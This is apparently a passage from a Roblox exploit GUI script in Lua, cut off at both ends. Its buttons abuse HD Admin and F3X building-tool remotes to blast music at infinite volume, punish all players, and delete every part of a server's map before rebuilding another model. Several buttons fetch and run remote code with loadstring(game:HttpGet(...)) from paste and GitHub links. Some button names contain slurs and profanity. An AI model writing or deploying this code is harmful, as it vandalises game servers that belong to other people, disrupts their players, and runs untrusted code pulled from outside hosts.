        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 8970668528")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Tiktok Song",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 95193399340158")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "You a psy fuck",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 114231543880153")
SilentRequest:InvokeServer(";pitch .25")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Hot Nga",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 97630633755576")
SilentRequest:InvokeServer(";pitch .1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Lucky",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 85995433116445")
SilentRequest:InvokeServer(";pitch .1588")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "1x1x1x1",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 100239536077614")
SilentRequest:InvokeServer(";pitch .121")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "couple days",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 84133314049806")
SilentRequest:InvokeServer(";pitch .2")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Code 18",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 87744462419495")
SilentRequest:InvokeServer(";pitch .117")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Banragang",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 111058084665367")
SilentRequest:InvokeServer(";pitch .115")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Subway Sexists2",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 129007552431697")
SilentRequest:InvokeServer(";pitch .117")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "1x9 music",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 119427795491464")
SilentRequest:InvokeServer(";pitch .1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Credit card smt",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 102278152256379")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Like u wanted",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 73659146808485")
SilentRequest:InvokeServer(";pitch .113")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Phonk 3",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 110393546895658")
SilentRequest:InvokeServer(";pitch .26")
SilentRequest:InvokeServer(";volume inf")
    end
})














MusicAddButton({
    Name = "Unmusic",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music")
    end
})
ExtraAddButton({
    Name = "c00lgui f3x by b2s",
    Callback = function()

 loadstring(game:HttpGet("https://gist.githubusercontent.com/Kotyara19k-Doorsspawner/01812a5a4fe103d45556670067ef85e1/raw/c157a2f739b2de7c8336e890e40d96e3a6d548fd/c00lguiByBlue2Spooky"))()
        
    end
})
ExtraAddButton({
    Name = "Blue2spooky V5",
    Callback = function()
loadstring(game:HttpGet("https://pastefy.app/kb8eBe96/raw"))()
 
        
    end
})
ExtraAddButton({
    Name = "F3X Panel",
    Callback = function()
 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/SkireScripts/F3X-Panel/main/Main.lua"))()
    end
})

ExtraAddButton({
    Name = "SadHaxxor Private",
    Callback = function()
loadstring(game:HttpGet('https://pastefy.app/KtBaQeQd/raw'))()
 
        
    end
})
ExtraAddButton({
    Name = "k00pgui",
    Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/RobloxCheat3rXD/Btools/refs/heads/main/k00pguif3xprivatengafuckghub.txt'))()
 
        
    end
})
ExtraAddButton({
    Name = "F3x Mania",
    Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Aueuwd/Pensjsj/refs/heads/main/Skaisuw'))()
 
        
    end
})
ExtraAddButton({
    Name = "Pelusin f3x gui",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Aueuwd/A/refs/heads/main/pelusingf3xproject.txt"))()
 
        
    end
})
ExtraAddButton({
    Name = "Grab knife",
    Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Aueuwd/A/refs/heads/main/Knife_Script_F3X_V3_Or_V4_LEAK.txt'))()
 
        
    end
})
MapsAddButton({
    Name = "Natural Disaster",
    Callback = function() 

--if it doesn't build the water re execute
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

pcall(function()
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";btools me")
wait(0.4)
RequestCommand:InvokeServer(";punish all")
end)

local backpack = player.Backpack
local function getf3x()
for _, v in ipairs(backpack:GetChildren()) do
if v:FindFirstChild("SyncAPI") then return v end
end
for _, v in ipairs(char:GetChildren()) do
if v:FindFirstChild("SyncAPI") then return v end
end
return nil
end

local f3x = getf3x()
if not f3x then return end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

local function fastInvoke(args)
task.spawn(function()
pcall(function()
serverendpoint:InvokeServer(unpack(args))
end)
end)
end

local function delete(part)
fastInvoke({"Remove", {part}})
end

for _, v in ipairs(Workspace:GetDescendants()) do
if v:IsA("BasePart") or v:IsA("UnionOperation") then
task.spawn(function()
pcall(function() delete(v) end)
end)
end
end

task.wait(0.8)

local model_id = "1363947141"
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
imported_model.Parent = Lighting

local f3x_name = "Building Tools"
local destination = Workspace

task.delay(15, function()
if imported_model then imported_model:Destroy() end
end)

local function f3xbuildpart(fake_part)
local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint
local partType =
fake_part:IsA("WedgePart") and "Wedge"
or fake_part:IsA("Seat") and "Seat"
or fake_part:IsA("VehicleSeat") and "VehicleSeat"
or fake_part:IsA("TrussPart") and "Truss"
or fake_part:IsA("SpawnLocation") and "Spawn"
or fake_part.Shape == Enum.PartType.Block and "Normal"
or fake_part.Shape == Enum.PartType.Ball and "Ball"
or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"

local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)
sync:InvokeServer("SyncResize", { { Part = created, CFrame = created.CFrame, Size = fake_part.Size } })
if fake_part.Transparency > 0 then
sync:InvokeServer("SyncMaterial", { { Part = created, Transparency = fake_part.Transparency } })
end
sync:InvokeServer("SyncColor", { { Part = created, Color = fake_part.Color, UnionColoring = true } })
sync:InvokeServer("SyncMaterial", { { Part = created, Material = fake_part.Material } })
sync:InvokeServer("SyncCollision", { { Part = created, CanCollide = fake_part.CanCollide } })
for _, tex in ipairs(fake_part:GetChildren()) do
if tex:IsA("Texture") then
sync:InvokeServer("CreateTextures", { { Part = created, Face = tex.Face, TextureType = "Texture" } })
sync:InvokeServer("SyncTexture", { { Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency } })
elseif tex:IsA("Decal") then
sync:InvokeServer("CreateTextures", { { Part = created, Face = tex.Face, TextureType = "Decal" } })
sync:InvokeServer("SyncTexture", { { Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency } })
elseif tex:IsA("SpecialMesh") then
sync:InvokeServer("CreateMeshes", { { Part = created } })
sync:InvokeServer("SyncMesh", { { Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale } })
end
end

end

for _, part in ipairs(imported_model:GetDescendants()) do
if part:IsA("BasePart") then
task.spawn(function()
f3xbuildpart(part)
end)
end
end

local function SpawnFuckingWater(model)
local minY = math.huge
for _, part in ipairs(model:GetDescendants()) do
if part:IsA("BasePart") then
local partY = part.Position.Y - part.Size.Y / 2
if partY < minY then
minY = partY
end
end
end

local plateY = minY + 20
local centerX = model:GetModelCFrame().p.X
local centerZ = model:GetModelCFrame().p.Z

fastInvoke({"CreatePart", "Normal", CFrame.new(centerX, plateY, centerZ), Workspace})
task.wait(1)

for _, v in Workspace:GetChildren() do
if v:IsA("BasePart") and math.floor(v.Position.Y) == math.floor(plateY) and math.floor(v.Position.X) == math.floor(centerX) then
task.spawn(function()
fastInvoke({"SyncResize", {{Part = v, CFrame = CFrame.new(centerX, plateY, centerZ), Size = Vector3.new(5000, 1, 5000)}}})
fastInvoke({"SyncColor", {{Part = v, Color = Color3.fromRGB(0, 120, 255), UnionColoring = false}}})
fastInvoke({"SyncMaterial", {{Part = v, Material = Enum.Material.Foil}}})
fastInvoke({"SyncCollision", {{Part = v, CanCollide = false}}})
fastInvoke({"SyncMaterial", {{Part = v, Transparency = 0}}})
while task.wait(1) do
pcall(function()
fastInvoke({"SetLocked", {v}, true})
end)
end
end)
end
end

end

SpawnFuckingWater(imported_model)

task.delay(2, function()
pcall(function()
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";res all")
end)
end)

 end
})
MapsAddButton({
    Name = "McDonald's",
    Callback = function() 
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
pcall(function()
    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(";btools me")
    RequestCommand:InvokeServer(";fogcolor black")
    wait(0.4)
    RequestCommand:InvokeServer(";punish all")
end)
local backpack = player.Backpack
local function getf3x()
    for _, v in ipairs(backpack:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    for _, v in ipairs(char:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    return nil
end

local f3x = getf3x()
if not f3x then warn("You don't have F3X") return end
local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: fast parallel invoke
local function fastInvoke(args)
    spawn(function()
        pcall(function()
            serverendpoint:InvokeServer(unpack(args))
        end)
    end)
end

-- Helper: delete parts
local function delete(part)
    fastInvoke({"Remove",{part}})
end

-- ===============================
-- DELETE ALL PARTS
-- ===============================
for _, v in ipairs(workspace:GetDescendants()) do
    if v:IsA("BasePart") or v:IsA("UnionOperation") then
        spawn(function()
            pcall(function() delete(v) end)
        end)
    end
end

print("All parts deleted. HDAdmin commands executed (initial).")

-- ===============================
-- F3X Model Loader
-- ===============================
local model_id = "13448848587" -- << your model here
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]

-- stash model in Lighting so it doesnt show locally
imported_model.Parent = Lighting

-- ===============================
-- Add a respawn inside the model
-- ===============================
local function addRespawnToModel(model)
    local spawn = Instance.new("SpawnLocation")
    spawn.Name = "Respawn"
    spawn.Size = Vector3.new(6,1,6)
    spawn.CFrame = model:GetModelCFrame() * CFrame.new(0,5,0)
    spawn.Anchored = true
    spawn.CanCollide = true
    spawn.Transparency = 0.5
    spawn.BrickColor = BrickColor.new("Bright green")
    spawn.Parent = model
end

addRespawnToModel(imported_model)

local f3x_name = "Building Tools"
local destination = workspace

-- cleanup after 15s
task.delay(15, function()
    if imported_model then
        imported_model:Destroy()
    end
end)

-- main function to rebuild a part with F3X
local function f3xbuildpart(fake_part)
    local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint

    local partType =  
        fake_part:IsA("WedgePart") and "Wedge"  
        or fake_part:IsA("Seat") and "Seat"  
        or fake_part:IsA("VehicleSeat") and "VehicleSeat"  
        or fake_part:IsA("TrussPart") and "Truss"  
        or fake_part:IsA("SpawnLocation") and "Spawn"  
        or fake_part.Shape == Enum.PartType.Block and "Normal"  
        or fake_part.Shape == Enum.PartType.Ball and "Ball"  
        or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"  

    local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)  

    -- resize  
    sync:InvokeServer("SyncResize", {  
        { Part = created, CFrame = created.CFrame, Size = fake_part.Size }  
    })  

    -- transparency  
    if fake_part.Transparency > 0 then  
        sync:InvokeServer("SyncMaterial", {  
            { Part = created, Transparency = fake_part.Transparency }  
        })  
    end  

    -- color  
    sync:InvokeServer("SyncColor", {  
        { Part = created, Color = fake_part.Color, UnionColoring = true }  
    })  

    -- material  
    sync:InvokeServer("SyncMaterial", {  
        { Part = created, Material = fake_part.Material }  
    })  

    -- collision  
    sync:InvokeServer("SyncCollision", {  
        { Part = created, CanCollide = fake_part.CanCollide }  
    })  

    -- textures & decals  
    for _, tex in ipairs(fake_part:GetChildren()) do  
        if tex:IsA("Texture") then  
            sync:InvokeServer("CreateTextures", {  
                { Part = created, Face = tex.Face, TextureType = "Texture" }  
            })  
            sync:InvokeServer("SyncTexture", {  
                { Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency }  
            })  
        elseif tex:IsA("Decal") then  
            sync:InvokeServer("CreateTextures", {  
                { Part = created, Face = tex.Face, TextureType = "Decal" }  
            })  
            sync:InvokeServer("SyncTexture", {  
                { Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency }  
            })  
        elseif tex:IsA("SpecialMesh") then  
            sync:InvokeServer("CreateMeshes", { { Part = created } })  
            sync:InvokeServer("SyncMesh", {  
                { Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale }  
            })  
        end  
    end
end

-- loop through the model and rebuild every supported part
for _, part in ipairs(imported_model:GetDescendants()) do
    if part:IsA("BasePart") then
        task.spawn(function()
            f3xbuildpart(part)
        end)
    end
end

print(" Finished building model " .. model_id .. " with F3X.")

-- ===============================
task.delay(2, function()
    pcall(function()
        local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        RequestCommand:InvokeServer(";fogcolor black ;time")
        wait(0.2)
        RequestCommand:InvokeServer(";res all")
        wait(0.2)
        RequestCommand:InvokeServer(";r6 all")
        wait(0.2)
        RequestCommand:InvokeServer(";time 14")
    end)
end)

 end
})
MapsAddButton({
    Name = "'Baldi Basics",
    Callback = function() 
-- =================================
-- Services
-- =================================
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- =================================
-- Initial HDAdmin commands (top)
-- =================================
pcall(function()
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommand:InvokeServer(";btools me")
	RequestCommand:InvokeServer(";fogcolor black")
	wait(0.4)
	RequestCommand:InvokeServer(";punish all")
end)

-- =================================
-- F3X (SyncAPI) detection
-- =================================
local backpack = player.Backpack
local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	return nil
end

local f3x = getf3x()
if not f3x then warn("You don't have F3X") return end
local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: fast safe invoke
local function fastInvoke(args)
	task.spawn(function()
		pcall(function()
			serverendpoint:InvokeServer(unpack(args))
		end)
	end)
end

local function delete(part)
	fastInvoke({"Remove",{part}})
end

-- =================================
-- DELETE ALL PARTS BEFORE BUILD
-- =================================
print(" Deleting all workspace parts...")

for _, v in ipairs(Workspace:GetDescendants()) do
	if v:IsA("BasePart") or v:IsA("UnionOperation") or v:IsA("Model") then
		task.spawn(function()
			pcall(function() delete(v) end)
		end)
	end
end

task.wait(3)
print(" Workspace cleared. Beginning rebuild...")

-- =================================
-- F3X Model Loader
-- =================================
local model_id = "106308418793602" -- your model
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
imported_model.Parent = Lighting

local f3x_name = "Building Tools"
local destination = Workspace

task.delay(15, function()
	if imported_model then
		imported_model:Destroy()
	end
end)

local function f3xbuildpart(fake_part)
	local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint

	local partType =
		fake_part:IsA("WedgePart") and "Wedge"
		or fake_part:IsA("Seat") and "Seat"
		or fake_part:IsA("VehicleSeat") and "VehicleSeat"
		or fake_part:IsA("TrussPart") and "Truss"
		or fake_part:IsA("SpawnLocation") and "Spawn"
		or fake_part.Shape == Enum.PartType.Block and "Normal"
		or fake_part.Shape == Enum.PartType.Ball and "Ball"
		or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"

	local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)

	sync:InvokeServer("SyncResize", { { Part = created, CFrame = created.CFrame, Size = fake_part.Size } })
	sync:InvokeServer("SyncColor", { { Part = created, Color = fake_part.Color, UnionColoring = true } })
	sync:InvokeServer("SyncMaterial", { { Part = created, Material = fake_part.Material, Transparency = fake_part.Transparency } })
	sync:InvokeServer("SyncCollision", { { Part = created, CanCollide = fake_part.CanCollide } })

	for _, tex in ipairs(fake_part:GetChildren()) do
		if tex:IsA("Texture") then
			sync:InvokeServer("CreateTextures", { { Part = created, Face = tex.Face, TextureType = "Texture" } })
			sync:InvokeServer("SyncTexture", { { Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency } })
		elseif tex:IsA("Decal") then
			sync:InvokeServer("CreateTextures", { { Part = created, Face = tex.Face, TextureType = "Decal" } })
			sync:InvokeServer("SyncTexture", { { Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency } })
		elseif tex:IsA("SpecialMesh") then
			sync:InvokeServer("CreateMeshes", { { Part = created } })
			sync:InvokeServer("SyncMesh", { { Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale } })
		end
	end
end

-- =================================
-- BUILD MODEL
-- =================================
for _, part in ipairs(imported_model:GetDescendants()) do
	if part:IsA("BasePart") then
		task.spawn(function() f3xbuildpart(part) end)
	end
end

print(" Finished building model " .. model_id .. " with F3X.")

-- =================================
-- AUTO PLACE RESPAWN INSIDE MODEL (FORWARD +7, LOWERED -5)
-- =================================
task.delay(6, function()
	if not imported_model then return end

	local modelParts = {}
	for _, v in ipairs(imported_model:GetDescendants()) do
		if v:IsA("BasePart") then
			table.insert(modelParts, v)
		end
	end

	if #modelParts == 0 then
		warn("No parts in model to place respawn!")
		return
	end

	local minX, minY, minZ = math.huge, math.huge, math.huge
	local maxX, maxY, maxZ = -math.huge, -math.huge, -math.huge

	for _, part in ipairs(modelParts) do
		local pos, size = part.Position, part.Size
		minX = math.min(minX, pos.X - size.X/2)
		minY = math.min(minY, pos.Y - size.Y/2)
		minZ = math.min(minZ, pos.Z - size.Z/2)
		maxX = math.max(maxX, pos.X + size.X/2)
		maxY = math.max(maxY, pos.Y + size.Y/2)
		maxZ = math.max(maxZ, pos.Z + size.Z/2)
	end

	local centerX, centerY, centerZ = (minX + maxX)/2, (minY + maxY)/2 - 21, (minZ + maxZ)/2
	local spawnPos = Vector3.new(centerX, centerY, centerZ)
	local forwardOffset = Vector3.new(0, 0, -7)
	local spawnCFrame = CFrame.new(spawnPos) * CFrame.new(forwardOffset)

	local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint
	local spawnPart = sync:InvokeServer("CreatePart", "Spawn", spawnCFrame, Workspace)

	sync:InvokeServer("SyncResize", { { Part = spawnPart, CFrame = spawnPart.CFrame, Size = Vector3.new(6, 1, 6) } })
	sync:InvokeServer("SyncColor", { { Part = spawnPart, Color = Color3.fromRGB(255, 255, 0), UnionColoring = true } })
	sync:InvokeServer("SyncMaterial", { { Part = spawnPart, Material = Enum.Material.Neon } })
	sync:InvokeServer("SyncProperties", {
		{ Part = spawnPart, Property = "Anchored", Value = true },
		{ Part = spawnPart, Property = "CanCollide", Value = true },
		{ Part = spawnPart, Property = "Neutral", Value = true },
		{ Part = spawnPart, Property = "TeamColor", Value = BrickColor.new("White") }
	})

	print(" Respawn pad placed inside model, moved forward by 7 studs and lowered by 5.")
end)

-- =================================
-- HDAdmin commands (bottom)
-- =================================
task.delay(15, function()
	pcall(function()
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";fogcolor black")
		wait(0.2)
		RequestCommand:InvokeServer(";res all")
		wait(0.2)
		RequestCommand:InvokeServer(";r6 all")
		wait(2.5)
		RequestCommand:InvokeServer(";music 139320390362159 ;pitch 0.307 ;volume 10")
	end)
end)

 end
})
MapsAddButton({
    Name = "Brookhaven",
    Callback = function() 
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- ===============================
-- Initial HDAdmin Commands (top)
-- ===============================
pcall(function()
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommand:InvokeServer(";btools me")
	RequestCommand:InvokeServer(";fogcolor black")
	wait(0.4)
	RequestCommand:InvokeServer(";punish all")
end)

-- ===============================
-- F3X (SyncAPI) Detection
-- ===============================
local function getF3X()
	for _, v in ipairs(player.Backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	return nil
end

local f3x = getF3X()
if not f3x then
	warn(" You don't have F3X equipped or in your backpack.")
	return
end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: safe invoke
local function fastInvoke(args)
	task.spawn(function()
		pcall(function()
			serverendpoint:InvokeServer(unpack(args))
		end)
	end)
end

-- Helper: delete a part
local function deletePart(part)
	fastInvoke({"Remove", {part}})
end

-- ===============================
-- DELETE ALL PARTS (BEFORE BUILD)
-- ===============================
print(" Deleting all workspace parts...")

for _, obj in ipairs(Workspace:GetDescendants()) do
	if obj:IsA("BasePart") or obj:IsA("UnionOperation") or obj:IsA("Model") then
		task.spawn(function()
			pcall(function() deletePart(obj) end)
		end)
	end
end

-- wait a moment to ensure cleanup is complete
task.wait(3)
print(" Workspace cleared. Starting rebuild...")

-- ===============================
-- IMPORT MODEL TO REBUILD
-- ===============================
local model_id = "12090119957" -- << your model here
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
if not imported_model then
	warn(" Failed to load model ID: " .. tostring(model_id))
	return
end

imported_model.Parent = Lighting -- stash away

local destination = Workspace
local f3x_name = "Building Tools"

-- auto cleanup imported clone
task.delay(15, function()
	if imported_model then
		imported_model:Destroy()
	end
end)

-- ===============================
-- F3X BUILD FUNCTION
-- ===============================
local function f3xBuildPart(fake_part)
	local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint

	local partType =
		fake_part:IsA("WedgePart") and "Wedge"
		or fake_part:IsA("Seat") and "Seat"
		or fake_part:IsA("VehicleSeat") and "VehicleSeat"
		or fake_part:IsA("TrussPart") and "Truss"
		or fake_part:IsA("SpawnLocation") and "Spawn"
		or fake_part.Shape == Enum.PartType.Block and "Normal"
		or fake_part.Shape == Enum.PartType.Ball and "Ball"
		or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"

	local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)

	-- resize
	sync:InvokeServer("SyncResize", {
		{ Part = created, CFrame = created.CFrame, Size = fake_part.Size }
	})

	-- color & transparency
	sync:InvokeServer("SyncColor", {
		{ Part = created, Color = fake_part.Color, UnionColoring = true }
	})
	sync:InvokeServer("SyncMaterial", {
		{ Part = created, Material = fake_part.Material, Transparency = fake_part.Transparency }
	})

	-- collision
	sync:InvokeServer("SyncCollision", {
		{ Part = created, CanCollide = fake_part.CanCollide }
	})

	-- apply textures / decals / meshes
	for _, tex in ipairs(fake_part:GetChildren()) do
		if tex:IsA("Texture") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Texture" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("Decal") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Decal" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("SpecialMesh") then
			sync:InvokeServer("CreateMeshes", { { Part = created } })
			sync:InvokeServer("SyncMesh", {
				{ Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale }
			})
		end
	end
end

-- ===============================
-- BUILD ALL MODEL PARTS
-- ===============================
for _, part in ipairs(imported_model:GetDescendants()) do
	if part:IsA("BasePart") then
		task.spawn(function()
			f3xBuildPart(part)
		end)
	end
end

print(" Finished rebuilding model:", model_id)

-- ===============================
-- HDAdmin Cleanup Commands
-- ===============================
task.delay(20, function()
	pcall(function()
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";fogcolor black")
		wait(0.2)
		RequestCommand:InvokeServer(";res all")
		wait(0.2)
		RequestCommand:InvokeServer(";r6 all")
	end)
end)

 end
})
MapsAddButton({
    Name = "Prison Life old map",
    Callback = function() 
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- ===============================
-- Initial HDAdmin Commands (top)
-- ===============================
pcall(function()
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommand:InvokeServer(";btools me")
	RequestCommand:InvokeServer(";fogcolor black")
	wait(0.4)
	RequestCommand:InvokeServer(";punish all")
end)

-- ===============================
-- F3X (SyncAPI) Detection
-- ===============================
local function getF3X()
	for _, v in ipairs(player.Backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	return nil
end

local f3x = getF3X()
if not f3x then
	warn(" You don't have F3X equipped or in your backpack.")
	return
end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: safe invoke
local function fastInvoke(args)
	task.spawn(function()
		pcall(function()
			serverendpoint:InvokeServer(unpack(args))
		end)
	end)
end

-- Helper: delete a part
local function deletePart(part)
	fastInvoke({"Remove", {part}})
end

-- ===============================
-- DELETE ALL PARTS (BEFORE BUILD)
-- ===============================
